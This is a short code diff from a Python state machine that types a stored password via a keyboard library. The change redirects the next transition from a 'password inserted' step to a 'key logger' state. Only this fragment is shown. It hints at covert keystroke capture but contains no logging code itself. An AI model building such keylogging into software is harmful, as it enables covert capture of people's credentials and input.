@@ -23,7 +23,7 @@ class ShadowInserPasswordState(State):
             if not cls.to_english() == 0:
                 return
         keyboard.write(cls.PASSWORD)
-        shadow_fsm.password_inserted()
+        shadow_fsm.to_key_logger()
 
     @classmethod
     def to_english(cls):
